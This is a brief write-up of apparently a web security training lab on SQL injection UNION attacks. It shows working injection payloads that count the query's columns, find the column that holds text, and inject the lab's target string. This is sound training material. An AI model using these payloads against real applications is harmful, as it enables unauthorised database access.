# SQL injection UNION attack, finding a column containing text
- SQL injection vulnerability in the product category filter.
- use a UNION attack to retrieve data from other tables.
- first need to determine the number of columns returned by the query
- next step is to identify a column that is compatible with string data
- lab will provide a random value that you need to make appear within the query results
# Goal 
- To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided
# Solving The lab
- find the number of columns like the previous lab with
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```
- we find that the db has three columns
- now to finding the column that contain text we brute force like this
```
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```
- we find that column 2 has text now to solving the lab
- the lab wants to display the string (Tt7JTN)
```
' UNION SELECT NULL,'Tt7JTN',NULL--
```
- and we solved the lab
